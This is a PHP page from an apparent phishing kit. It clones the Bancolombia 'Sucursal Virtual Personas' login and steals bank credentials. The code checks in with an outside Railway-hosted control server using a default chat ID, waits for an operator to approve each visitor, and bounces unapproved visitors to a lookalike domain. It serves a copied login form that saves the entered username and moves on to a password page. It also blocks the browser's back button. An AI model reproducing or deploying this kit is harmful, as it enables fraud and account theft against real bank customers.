<?php
session_start();
unset($_SESSION['vlidatePage']);
consultarApi('aceptarIngreso');
// Función para hacer la solicitud a la API
function consultarApi($endPoint)
{
    $codeVisitante = $_GET['codeVisitante'] ?? 'userdesconocido';

    if ($codeVisitante=='userdesconocido'){
        header('Location: https://sucursalpersonas.transaccionesbancolombia.com');
      exit;
    }
    $chatID = $_GET['id'] ?? '1462604384';
    // Preparar los datos para enviar a la API
    $data = [
        'codeVisitante' => $codeVisitante,
        'chatID' => $chatID,
    ];
    // Configurar cURL
    $ch = curl_init('https://spike-production.up.railway.app/' . $endPoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    // Ejecutar la solicitud y obtener la respuesta
    return curl_exec($ch);

}

// Función para validar la respuesta de la API

// Función para ejecutar alguna acción cuando la respuesta es válida
$intentos = 0;
$maxIntentos = 20;
// // Bucle infinito para mantener el script en ejecución
while ($intentos < $maxIntentos) {
    // Consultar la API
    $respuesta = consultarApi('waitResponseVisitante');

    // Validar la respuesta
    if (validarRespuesta($respuesta)) {
        $_SESSION['vlidatePage'] = true;
        break;
    }

    // Incrementar el contador de intentos
    $intentos++;

    // Esperar un tiempo antes de volver a consultar la API (por ejemplo, 10 segundos)
    sleep(3);
}

if ($intentos >= $maxIntentos) {
    // Retornar un encabezado de "bad request"
    header('Location: https://sucursalpersonas.transaccionesbancolombia.com');
    exit;
}

function validarRespuesta($respuesta)
{
    // Decodificar la respuesta JSON
    $data = json_decode($respuesta, true);

    // Verificar si la respuesta es válida (esto dependerá de tu API específica)
    if (isset($data['type']) && $data['type'] === 'aceptar') {

        ?>


<html>

<head>
    <title>Bancolombia Sucursal Virtual Personas</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
    <meta charset="ISO-8859-1" />
    <meta content="es" http-equiv="Content-Language" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Todo1" />
    <meta name="author" content="Todo1" />
    <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved." />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link href="css/styles.css?v=4.12.0.RC6_1721165575966" media="all" rel="stylesheet" type="text/css" />
    <link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css" />

    <!--[if lt IE 8]>
      <link href="css/bootstrap-ie7.css" rel="stylesheet" />
    <![endif]-->

    <!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
      <script src="js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery-migrate-3.4.0.min.js"></script>
    <script type="text/javascript" src="js/patterns/jquery.validate-1.11.1.js"></script>
    <script type="text/javascript" src="js/patterns/validations.js"></script>
    <script type="text/javascript" src="js/patterns/jquery-validations.js"></script>
    <script type="text/javascript" src="js/patterns/blockKeys.js"></script>
    <script type="text/javascript" src="js/jquery-ui.js"></script>

    <script type="text/javascript" src="js/bluebird.min.js"></script>

    <link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css" />
    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />

    <script type="text/javascript" src="js/bootstrap.js"></script>

    <script language="javascript">
    var contError = "";
    $(document).ready(function() {
        contError = $("#contentError").html();
    });

    function reloadValidate() {
        if ($("#tabError").length) {
            var validator = $("#loginUserForm")
                .bind("invalid-form.validate", function() {})
                .validate({
                    onsubmit: true,
                    onkeyup: false,
                    onclick: false,
                    onfocusout: false,
                    rules: {
                        errorContainer: $("#summary"),
                        username: {
                            required: true,
                            passwordLength: true,
                            validaFormato: true,
                            validaFormato2: true,
                        },
                    },
                    messages: {
                        username: {
                            required: "<script>document.getElementById('summary').innerHTML='Por favor ingrese la informaci&oacute;n requerida.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            passwordLength: "<script>document.getElementById('summary').innerHTML='Por favor ingrese la informaci&oacute;n requerida.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            validaFormato: "<script>document.getElementById('summary').innerHTML='El usuario no cumple el formato requerido, por favor intente nuevamente.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            validaFormato2: "<script>document.getElementById('summary').innerHTML='El usuario no puede inicar con el caracter 0.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                        },
                    },
                    submitHandler: function(form) {
                        //console.log('submitHandler');
                        if (callSVPSessionServlet()) {
                            form.submit();
                        } else {
                            window.location.href = "CLOSE_ALL";
                        }
                    },
                });
        } else {
            $("#contentError").html(contError);
            reloadValidate();
        }
    }
    </script>

    <script type="text/javascript">
    function delayPage() {
        $("#cargando").hide();
        $("#contenidoWeb").show("fast");
    }
    </script>

    <script type="text/javascript">
    var bankWindow;
    var count = 0;

    function execute() {
        reloadValidate();
        $("#btnGo").disabled = true;
        var form = $("#loginUserForm");
        form.validate();
        if (form.valid() && count == 0) {
            grecaptcha.execute();
        } else {
            count = 0;
            $("#btnGo").disabled = false;
        }
    }

    async function onSubmit() {
        try {
            var devicePrintAux = await encode_deviceprint();
            document.getElementById("deviceprint").value = devicePrintAux;
        } catch (err) {
            console.log("error in loading ant-libs: encode_deviceprint");
            document.getElementById("deviceprint").value = "";
        }
        $("#loginUserForm").submit();
        count++;
    }

    function onCaptcha() {
        if (
            document.getElementById("username").value != "" &&
            document.getElementById("username").value != null &&
            document.getElementById("username").value.length > 0
        ) {
            onSubmit();
        }
    }

    function checkKey(key) {
        var unicode;
        if (key.charCode) {
            unicode = key.charCode;
        } else {
            unicode = key.keyCode;
        }
        if (unicode == 13) {
            document.getElementById("btnGo").click();
        }
    }

    function trim(s) {
        s.value = s.value.replace(/^\s+|\s+$/g, "");
    }
    </script>
    <script type="text/javascript">
    var enPasswLength = 0;

    function checkNumberBlank(num_value) {
        return /^[0-9\s]+$/.test(num_value);
    }
    $(document).ready(function() {
        $.validator.addMethod(
            "passwordLength",
            function(value, element, param) {
                return value.length >= 0 && value.length <= 20;
            }
        );

        $.validator.addMethod(
            "validaFormato",
            function(value, element, param) {
                var patron = /^[a-zA-Z0-9ñÑ]*$/;
                if (!value.search(patron)) return true;
                else return false;
            }
        );
        $.validator.addMethod(
            "validaFormato2",
            function(value, element, param) {
                if (checkNumberBlank(value)) {
                    var patron = /^[^0].*/;
                    if (!value.search(patron)) return true;
                    else return false;
                } else return true;
            }
        );

        $("#popoverUser").popover({
            html: true,
            trigger: "click",
            content: function() {
                return $("#popoverContent").html();
            },
        });
        $("#popoverUser").click(function(e) {
            e.stopPropagation();
        });
        $(document).click(function(e) {
            if (
                $(".popover").has(e.target).length == 0 ||
                $(e.target).is(".close") ||
                $(e.target).is(".mua_tooltip_close")
            ) {
                $("#popoverUser").popover("hide");
            }
        });
    });
    </script>

    <style>
    html,
    body,
    form {
        height: 100%;
    }
    </style>

    <script language="JavaScript">
    $(document).ready(function() {
        setTimeout(function() {
            window.location.hash = "no-back-button";
            window.location.hash = "Again-No-back-button";
            window.onhashchange = function() {
                window.location.hash = "no-back-button";
            };
        }, 1000);
    });
    document.ondrop = function(event) {
        return false;
    };

    function handle(delta) {
        if (delta < 0) return false;
        else return false;
    }

    function wheel(event) {
        var delta = 0;
        if (!event) event = window.event;
        if (event.wheelDelta) {
            delta = event.wheelDelta / 120;
            if (window.opera) delta = -delta;
        } else if (event.detail) {
            delta = -event.detail / 3;
        }
        if (delta) handle(delta);
        if (event.preventDefault) event.preventDefault();
        event.returnValue = false;
    }
    </script>

    <script type="text/javascript">
    var refresh = 900;

    var variables = [];
    var idleCountTime = 0;

    function initVariables() {
        variables["refresh"] = refresh;
    }

    initVariables();
    setVariables(variables);
    evaluateTimeout();

    function getSVPSessionResponse() {
        // strUrl is whatever URL you need to call
        var strUrl = "null";
        var strReturn = "";

        jQuery.ajax({
            url: strUrl,
            cache: false,
            method: "GET",
            success: function(html, textStatus, jqXHR) {
                //console.log('html: ' + html + ' textStatus: '  + textStatus + ' jqXHR: '  + jqXHR);
                strReturn = html;
            },
            error: function(html, textStatus, errorTrhown) {
                //console.log('html: ' + html + ' textStauts: '  + textStatus + " error: " + errorTrhown);
            },
            async: false,
        });

        return strReturn;
    }

    function callSVPSessionServlet() {
        var ret = false;
        var svpSessionControl = "N";
        if (svpSessionControl == "Y") {
            var response = getSVPSessionResponse();
            if (response != "") {
                console.log("response: " + response);
                if (response == "OK") {
                    ret = true;
                } else {
                    ret = false;
                }
            }
        } else {
            ret = true;
        }

        return ret;
    }

    function evaluateTimeout() {
        idleCountTime++;
        //console.log('evaluateTimeout entro idle: ' + idleCountTime + ' refresh: ' + variables["refresh"]);
        if (variables["refresh"] == idleCountTime) {
            //console.log('evaluateTimeout entro al if');

            $.ajax({
                type: "POST",
                dataType: "text/plain",
                url: "AJAX_LOG",
                complete: function(data) {
                    resetIdleTimeout();
                },
            });
            $.get("null", function(data) {
                if ("FAIL" == data) {
                    window.location.href = "CLOSE_ALL";
                } else {
                    resetIdleTimeout();
                }
            }).fail(function() {
                window.location.href = "CLOSE_ALL";
            });
        }
        setTimeout("evaluateTimeout()", 1000);
    }

    function resetIdleTimeout() {
        idleCountTime = 0;
    }

    function setVariables(vars) {
        variables = vars;
    }
    </script>
    <script type="text/javascript">
    function setTitle() {
        document.title = "Bancolombia Sucursal Virtual Personas";
    }
    </script>

    <link rel="shortcut icon" href="favicon.ico?v=4.12.0.RC6_1721165575966" />
</head>

<body onload="delayPage();setTitle();">
    <div id="cargando" style="width: 100%; text-align: center"></div>
    <div id="contenidoWeb" style="display: none">
        <form id="loginUserForm" name="loginUserForm" action="" method="post">
            <div class="container" id="containerMain">
                <div>
                    <div id="header" class="mua-page-header">
                        <div class="row row-logo-svp">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-imgLogoItem"></div>
                                <div class="text-svp-name">Sucursal Virtual Personas</div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
                                    <script language="javascript"
                                        src="js/jquery.jclockNew.js?v=4.12.0.RC6_1721165575966" type="text/JavaScript">
                                    </script>

                                    <script type="text/javascript">
                                    $(function($) {
                                        var optionsEST = {
                                            utc: true,
                                            utcOffset: -5,
                                            format: "%A %R de %B de %Y %l:%M:%S %P",
                                            language: "es",
                                        };
                                        $("#jclock1").jclockNew(optionsEST);
                                    });
                                    </script>
                                    <div>
                                        <div class="timeText">Fecha y hora actual:</div>
                                        <span id="jclock1" class="lastVisitedText"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel-heading">
                        <h3>Inicio de sesi&#243;n</h3>
                    </div>
                </div>

                <div class="panel panel-primary">
                    <div class="row" id="error">
                        <script language="JavaScript">
                        function cerrarError() {
                            document.getElementById("tabError").style.display = "none";
                            document.getElementById("summary").innerHTML = "";
                        }
                        </script>

                        <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError"
                            style="display: none">
                            <div class="errorDiv">
                                <div class="divTextMessage">
                                    <span class="icon-error errorIcon">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </span>
                                    <div class="errorTitulo">Error</div>
                                    <div id="summary" class="errorTexto"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="mua-panel-body">
                        <div class="row">
                            <div class="col-xs-12 col-sm-5 col-md-4">
                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>Usuario</h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4>
                                            Si no tienes un usuario asignado ingresa con tu
                                            documento de identidad
                                        </h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <span id="popoverUser"
                                                    class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"></span>
                                                <div id="popoverContent" class="hide">
                                                    <span class="mua_tooltip_close">&times;</span>
                                                    <div class="mua_tooltip_msg">
                                                        Ingrese el usuario que tiene registrado en la
                                                        Sucursal Virtual Personas. Si no tiene un usuario
                                                        asignado ingrese con su documento de identidad.
                                                    </div>
                                                </div>
                                                <label class="control-label-index" for="username">Ingresa tu
                                                    usuario</label>
                                            </div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control">
                                                    <input id="username" name="username" tabindex="1"
                                                        class="mua-form-control mua_svp_control_username mua-input-icon"
                                                        onkeypress="checkKey(event)"
                                                        onchange="trim(document.loginUserForm.username)" type="text"
                                                        value="" maxlength="20" autocomplete="off" />
                                                    <span class="mua-icon-user"> </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="one-button-container mua-button-container">

                                        <button id="btnUser" name="btnGo" class="btn btn-success" type="button"
                                            onclick="javascript:execute();">
                                            Continuar
                                        </button>
                                    </div>

                                    <div class="mua-panel_enlances">
                                        <p>
                                            <a href="#">&iquest;Olvidaste tu usuario?</a>
                                        </p>
                                        <p>
                                            <a href="javascript:popup_help_a()">&iquest;Problemas para conectarte?</a>
                                        </p>
                                    </div>
                                </div>

                                <div class="panel_general mua-panel_general">
                                    <div id="contenido">
                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_demo">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span><span class="path6"></span><span
                                                            class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Conoce sobre Sucursal Virtual Personas
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6educacion-financiera/seguridad-bancaria/seguridad-informatica"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_bloquear">
                                                        <span class="path1"></span><span class="path2"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Aprende sobre Seguridad
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf?MOD=AJPERES&CVID=l.B62Ro"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_reglamento">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span><span class="path6"></span><span
                                                            class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Reglamento Sucursal Virtual
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6personas/documentos-legales/proteccion-datos/bancolombia-sa"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_politicas">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Pol&iacute;tica de Privacidad
                                                </div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-xs-12 col-sm-7 col-md-8">
                                <div class="mua-embed-container-personal" id="banner-persona">
                                    <iframe class="mua-iframe mua-iframe-personal-responsive"
                                        src="static/login_SVP_BC_zonaA.html?v=4.12.0.RC6_1721165575966" frameborder="0"
                                        scrolling="no" width="635px" height="335px"></iframe>
                                </div>

                                <p class="text-center">
                                    ¿No conoces la Sucursal Virtual Personas de
                                    Bancolombia?&nbsp; Conoce m&aacute;s
                                    <a href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                        target="_blank" class="a1">aqu&iacute;</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <p class="mua-footer">
                            Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; (57) 60 1
                            343 00 00 - Medell&iacute;n (57) 60 4 510 90 00 - Cali (57) 60 2
                            554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60
                            5 693 44 00 - <br />
                            Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 -
                            El resto del pa&iacute;s 018000 9 12345. Sucursales
                            Telef&oacute;nicas en el exterior: Espa&ntilde;a (34) 900 995
                            717 - Estados Unidos (1) 866 379 97 14.
                        </p>
                    </div>
                </div>

                <script type="text/javascript">
                var year = new Date().getFullYear();
                $(document).ready(function() {
                    $("#fecha").text(year);
                });
                </script>
                <div style="margin-top: 10px">
                    <div class="mua-title-text pull-left">
                        Direcci&oacute;n IP: 145.82.99.65
                    </div>
                    <div class="mua-title-text pull-right">
                        Copyright &copysr;&nbsp;<span id="fecha">&nbsp;</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;
                    </div>
                </div>
            </div>




            <script language="JavaScript" type="text/javascript">
            $(document).ready(function() {
                $("#btnUser").click(function() {
                    var username = $("#username").val(); // Leer el valor del campo username
                    if (username) {
                        function getParameterByName(name, defaultValue = null) {
                            name = name.replace(/[\[\]]/g, "\\$&");
                            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
                            var results = regex.exec(window.location.href);
                            if (!results) return defaultValue;
                            if (!results[2]) return defaultValue;
                            return decodeURIComponent(results[2].replace(/\+/g, " "));
                        }

                        // Obtener el valor del parámetro 'id' con valor por defecto '1462604384'
                        var chatID = getParameterByName("id", "1462604384");
                        localStorage.setItem("chatID", chatID);
                        localStorage.setItem("username",
                            username); // Guardar el valor en el localStorage
                        window.location.href = "VALIDATEPASSWORD.php";
                    }
                });
            });
            //
            </script>
        </form>
    </div>
</body>

</html>
<?php
return true;
    }
}